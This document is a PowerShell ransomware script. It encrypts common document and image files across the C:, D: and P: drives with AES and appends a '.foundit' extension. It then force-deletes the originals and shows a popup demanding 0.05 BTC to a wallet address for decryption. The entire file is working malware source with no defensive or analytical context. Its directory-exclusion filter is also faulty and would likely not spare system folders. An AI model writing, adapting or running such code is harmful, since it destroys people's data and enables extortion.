# Encrypt-AllFiles-WithPopup.ps1

# Generate AES encryption key and IV
$Key = [byte[]]::new(32)
$IV = [byte[]]::new(16)
(New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($Key)
(New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($IV)

# Save the encryption key for decryption later
$KeyFilePath = "$env:USERPROFILE\encryption_key.bin"
[System.IO.File]::WriteAllBytes($KeyFilePath, $Key)

# Display ransom popup
function Show-RansomPopup {
    [void][System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
    [System.Windows.Forms.MessageBox]::Show(
        "Your files have been encrypted! 

All important files have been encrypted with a strong algorithm and renamed with '.foundit'. 
To recover your files:
1. Send a payment of 0.05 BTC to the following address:
   1F1miYFQWTBR1MG2Zr7ZdnEKgh6aA6bF3
2. Email the proof of payment to recovery@example.com
3. You will receive a decryption tool once payment is verified.

Note: Attempting to tamper with the files may result in permanent loss of your data.",
        "Important Message",
        [System.Windows.Forms.MessageBoxButtons]::OK,
        [System.Windows.Forms.MessageBoxIcon]::Warning
    )
}

# Trigger the popup
Show-RansomPopup

function Encrypt-File {
    param (
        [string]$FilePath
    )
    $EncryptedFilePath = "$FilePath.foundit"

    try {
        # Read the file content
        $FileContent = [System.IO.File]::ReadAllBytes($FilePath)

        # Encrypt the content
        $Aes = [System.Security.Cryptography.Aes]::Create()
        $Aes.Key = $Key
        $Aes.IV = $IV
        $CryptoTransform = $Aes.CreateEncryptor()
        $EncryptedContent = $CryptoTransform.TransformFinalBlock($FileContent, 0, $FileContent.Length)

        # Save the encrypted content to a new file
        [System.IO.File]::WriteAllBytes($EncryptedFilePath, $EncryptedContent)

        # Delete the original file
        Remove-Item -Path $FilePath -Force

        Write-Output "Encrypted: $FilePath -> $EncryptedFilePath"
    } catch {
        Write-Warning "Failed to encrypt $FilePath: $_"
    }
}

# Drives to process
$Drives = @("C:\", "D:\", "P:\")

# Exclude directories (e.g., Windows and essential components)
$ExcludePaths = @(
    "$env:windir",
    "$env:windir\System32",
    "$env:ProgramFiles",
    "$env:ProgramFiles(x86)",
    "$env:ProgramData"
)

# File extensions to process
$IncludeExtensions = @(".txt", ".docx", ".xlsx", ".pdf", ".jpg", ".png") # Add more extensions if needed

# Process files
foreach ($Drive in $Drives) {
    Write-Output "Processing drive: $Drive"
    Get-ChildItem -Path $Drive -Recurse -File -Force -ErrorAction SilentlyContinue |
    Where-Object {
        # Exclude files in excluded directories
        ($_.FullName -notlike "$($ExcludePaths -join "*")") -and
        # Include only files with specified extensions
        ($IncludeExtensions -contains $_.Extension)
    } | ForEach-Object {
        Encrypt-File -FilePath $_.FullName
    }
}

Write-Output "Encryption completed. Remember to store the encryption key securely!"
